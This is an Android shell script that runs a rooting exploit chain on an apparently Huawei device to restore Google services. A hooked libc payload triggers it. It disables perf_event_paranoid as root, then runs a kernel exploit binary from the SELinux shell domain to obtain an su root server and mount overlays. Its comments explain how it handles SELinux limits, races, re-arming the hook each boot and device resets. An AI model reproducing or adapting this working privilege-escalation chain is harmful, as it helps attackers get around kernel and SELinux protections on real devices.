#!/system/bin/sh
# gms_restore.sh - restore ROOT + native GMS from the libc open64 hook payload (v5).
#
# The payload's two-stage guard sends this script to two different processes that a
# single bug-report trigger starts:
#   uid 0    -> dumpstate (all caps): may write perf_event_paranoid, may NOT execute
#               shell_data_file, so stage 1 only turns perf on and exits.
#   uid 2000 -> the shell application's bugreportz (= the SELinux SHELL DOMAIN): the only
#               domain allowed to execute shell_data_file, so stage 2 runs the exploit.
#
# Both markers live in /data/local/tmp on purpose: the exploit's root_mount_and_shell()
# may mount a tmpfs over /dev (it is one of its fallback targets), which would delete a
# marker kept in /dev and let the hook fire again -> run the exploit a second time ->
# observed device reset.
#
# v5 additions: an idempotency pre-check (if our GMS overlay is already mounted, just
# clean up and exit, never run the exploit again) and both markers are removed at the
# end, so the hook re-arms for the next boot.  Set /data/local/tmp/.gl_no_restart to
# skip the framework restart (used to isolate the reset cause).

PATH=/system/bin:/vendor/bin:/system/xbin
export PATH
D=/data/local/tmp
exec >> $D/glroot.log 2>&1
chmod 644 $D/glroot.log 2>/dev/null
echo "=== gms_restore $(date) uid=$(id -u) ==="
echo "uid=$(id)"
echo "ctx=$(cat /proc/self/attr/current 2>/dev/null)"
echo "cap=$(grep CapEff /proc/self/status 2>/dev/null)"

# =============================================================== stage 1: uid 0 (perf)
if [ "$(id -u)" = "0" ]; then
    echo -1 > /proc/sys/kernel/perf_event_paranoid
    echo "perf_after_write=$(cat /proc/sys/kernel/perf_event_paranoid 2>/dev/null)"
    # Clear a stale stage-2 marker (see the payload's uid-0 unlink for why).  This only
    # works when the firing domain really has CAP_DAC_OVERRIDE (dumpstate/netd do; init
    # does not), which is why the payload tries it as well.
    rm -f $D/.glp2 2>/dev/null
    exit 0
fi

# ============================================= stage 2: uid 2000 (the shell domain)
# ONLY u:r:shell:s0 may execute shell_data_file (our exploit).  Other uid-2000 domains
# also fire the hook - a dumpstate-domain child was measured - and they CAN claim the
# one-shot (uid 2000 owns /data/local/tmp).  They cannot run the exploit though, so they
# must release the marker and let a shell-domain firing (bugreportz keeps opening files,
# or the adb shell) claim it and do the real restore.
CTX=$(cat /proc/self/attr/current 2>/dev/null)
case "$CTX" in
    *shell*) : ;;
    *) echo "stage2: domain '$CTX' is not shell -> releasing the marker and exiting"
       rm -f $D/.glp2 2>/dev/null
       exit 0 ;;
esac

# ONE real restore per boot, enforced ATOMICALLY.  The first version compared the boot id
# stored in a file; two stage-2 processes firing at the same moment can both read "no stamp
# yet" and both proceed (a read-then-write race) - and that is exactly what was measured
# (overlay count 6 again).  mkdir(2) is atomic, so exactly one process wins the per-boot lock.
BID=$(cat /proc/sys/kernel/random/boot_id 2>/dev/null)
if [ -n "$BID" ]; then
    if ! mkdir "$D/.glboot.$BID" 2>/dev/null; then
        echo "stage2: boot $BID already handled -> exiting (no second exploit run)"
        exit 0
    fi
fi
echo "stage2: boot $BID -> starting the restore"
# Idempotency: if our overlay is already in place, this boot was already restored.
if toybox grep -q "upperdir=$D/glrt/gms/upper-priv" /proc/mounts 2>/dev/null; then
    echo "already restored this boot (overlay present) -> cleaning markers and exiting"
    rm -f $D/.glp0 2>/dev/null
    exit 0
fi

# Lower the memory pressure BEFORE the exploit runs.  MEASURED (FACTS 9an(169)): under
# pressure Huawei's low-memory path selected the exploit's pid-0 shielded task and forced
# do_exit() on it; do_exit() for pid 0 panics ("Attempted to kill the idle task") and the
# device resets itself 1-2 min after an otherwise successful restore.  The pressure comes
# from the GMS/Play crash loop that the Play self-update leaves behind (/data copies with no
# system base at boot).  This script runs as uid 2000 in u:r:shell:s0, which holds
# FORCE_STOP_PACKAGES, so it can clear them for the duration of the restore.
for p in com.google.android.gms com.android.vending com.google.android.youtube; do
    am force-stop "$p" 2>/dev/null
done
echo "stage2: force-stopped the google packages to lower memory pressure"

i=0
while [ $i -lt 60 ]; do
    [ "$(cat /proc/sys/kernel/perf_event_paranoid 2>/dev/null)" = "-1" ] && break
    sleep 2
    i=$((i+1))
done
perf=$(cat /proc/sys/kernel/perf_event_paranoid 2>/dev/null)
echo "perf=$perf (waited $((i*2))s)"
if [ "$perf" != "-1" ]; then
    # NEVER start the exploit without perf: its KASLR leak uses perf_event_open and dies
    # with "[-] KASLR leak failed" (ghostlock_mrx_e.c:3365), after which this script waits
    # 120 s for a root server that can never appear - that is the "slow restore".
    # Release the one-shot instead, so a later uid-2000 open64 (bugreportz keeps opening
    # files) retries once stage 1 has actually run.
    echo "ABORT: perf is not -1 -> stage 1 has not run; NOT starting the exploit"
    rm -f $D/.glp2 2>/dev/null
    exit 0
fi

# ---- run the exploit: --root-gms does the GMS overlays + restart itself ----------
# The uid-0 child of --root-gms holds CAP_SYS_ADMIN in init's mount namespace, so it
# runs gms_setup.sh (staging -> glrt/gms), mount(2)s the three overlays DIRECTLY and
# issues the framework restart.  The gl_su broker cannot do that: its child has no
# effective capabilities at all (measured CapEff=0), so GLMOUNT returns EPERM.
nohup $D/ghostlock_e --root-gms > $D/gl.root.out 2>&1 &
chmod 644 $D/gl.root.out 2>/dev/null
i=0
while [ $i -lt 120 ]; do
    $D/su -c true >/dev/null 2>&1 && break
    sleep 2
    i=$((i+1))
done
if ! $D/su -c true >/dev/null 2>&1; then
    echo "ABORT: the gl_su root command server never came up"
    exit 1
fi
echo "root server ready (after $((i*2)) s)"
echo "overlays mounted: $(grep -c "upperdir=$D/glrt/gms" /proc/mounts 2>/dev/null)/3"
echo "(the framework restart is issued by --root-gms itself)"

# ---- re-arm for the next boot ---------------------------------------------------
# Both markers must be cleared here so the next boot can fire again.  The pre-check
# path above deliberately does NOT delete the uid-2000 marker: deleting it there made
# the still-live hook re-fire stage 2 on every uid-2000 open64.  Clearing it exactly
# once here (after a real restore) costs at most ONE extra no-op run: the next uid-2000
# open64 re-claims the marker, its pre-check sees the overlay and exits while KEEPING
# the marker, and everything goes quiet.
rm -f $D/.glp0 $D/.glp2 2>/dev/null
echo "=== markers cleared (re-armed; the hook itself dies with the next reboot) ==="
